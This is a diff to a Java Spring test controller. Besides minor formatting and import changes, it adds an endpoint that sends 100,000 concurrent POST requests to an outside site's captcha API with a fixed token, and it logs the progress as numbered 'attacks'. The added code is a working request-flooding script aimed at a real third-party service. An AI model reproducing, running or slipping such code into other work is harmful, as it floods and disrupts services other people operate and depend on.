@@ -14,10 +14,13 @@ import com.zx.entity.HgBean;
 import com.zx.entity.Tbuser;
 import com.zx.mapper.TbuserMapper;
 import com.zx.service.TbuserService;
+import com.zx.utils.HttpClientResult;
+import com.zx.utils.HttpClientUtil;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.core.task.TaskExecutor;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
 import javax.annotation.Resource;
@@ -43,8 +46,6 @@ public class TestController {
     @Autowired
     TbuserMapper tbuserMapper;
 
-    @Resource
-    private TaskExecutor taskExecutor;
 
     @PostMapping("/zhangxin")
     public String test() {
@@ -75,14 +76,14 @@ public class TestController {
                     list.add(Integer.valueOf(s));
                     i++;
                 } else {
-                    if (j<=5800){
+                    if (j <= 5800) {
                         Integer test = tbuserMapper.test(list);
                         if (test != 100) {
                             listList.add(list);
                         }
                         list = new ArrayList<>();
                         i = 0;
-                    }else {
+                    } else {
                         Integer test = tbuserMapper.test(list);
 
                     }
@@ -148,6 +149,38 @@ public class TestController {
         AES aes = SecureUtil.aes(key.getBytes());
         //加密
         return aes.decryptStr(text);
+    }
+
+    @Resource
+    private TaskExecutor taskExecutor;
+    @RequestMapping("/fuck")
+    public  void  fuck() throws Exception {
+        String url = "http://www.beatriceyu.vip/api/im/captcha";
+        Map<String, String> map = new HashMap<>();
+        map.put("type", "android");
+        map.put("token", "1668241368496");
+        for (int  i=0;i<100000;i++){
+            int finalI = i;
+            taskExecutor.execute(()->{
+                try {
+                    HttpClientResult httpClientResult = HttpClientUtil.doPost(url, map);
+
+                    if (finalI%100==0){
+                        System.out.println(httpClientResult.getContent());
+                        System.out.println("第"+ finalI +"次攻击");
+                    }
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            });
+        }
+    }
+
+
+    public static void main(String[] args) throws Exception {
+
+
     }
 
 
